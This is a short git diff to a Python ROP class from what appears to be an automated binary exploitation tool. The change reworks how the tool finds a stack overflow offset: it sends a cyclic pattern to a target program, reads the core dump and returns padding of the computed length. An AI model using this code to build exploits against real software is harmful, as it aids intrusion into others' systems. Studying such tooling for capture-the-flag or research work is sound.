@@ -5,6 +5,7 @@ import claripy
 import subprocess
 import os
 from Print import Print
+import time
 
 class ROP:
     def __init__(self, analysis, v_lvl, p): 
@@ -65,15 +66,17 @@ class ROP:
         attempts = 0
         try:
             p = process(self.filename)
-            p.sendline(cyclic(2500, n=8))
-            p.wait()
-            core = p.corefile
-            p.close()
-            os.remove(core.file.name)
+            p.sendline(cyclic(500, n=8))
+            
+            time.sleep(0.1)
+            core = Coredump(f"./core_files/core.{p.pid}")
+            os.remove(f"./core_files/core.{p.pid}")
             offset = cyclic_find(core.read(core.rsp, 8), n=8)
+            
+            p.close()
             return b'A'*offset
         # TODO: catch all exceptions and run symbolic analysis as a last ditch effort
-        except PwnlibException as e:
+        except:
             self.fart_print.warning("Dynamic overflow failed! Attempting symbolic analysis")
             return Get2overflow(self.filename, self.v_lvl).buf()
 
